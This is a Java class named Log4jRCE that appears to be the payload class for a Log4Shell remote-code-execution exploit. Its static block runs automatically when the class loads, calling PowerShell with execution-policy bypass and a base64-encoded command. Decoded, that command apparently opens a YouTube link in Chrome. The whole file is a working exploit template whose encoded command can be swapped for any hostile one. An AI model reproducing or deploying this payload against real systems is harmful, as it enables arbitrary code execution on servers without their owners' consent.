public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc cwB0AGEAcgB0ACAAYwBoAHIAbwBtAGUAIABoAHQAdABwAHMAOgAvAC8AeQBvAHUAdAB1AC4AYgBlAC8AZABRAHcANAB3ADkAVwBnAFgAYwBRACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABtAGEAeABpAG0AaQB6AGUAZAANAAoA").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
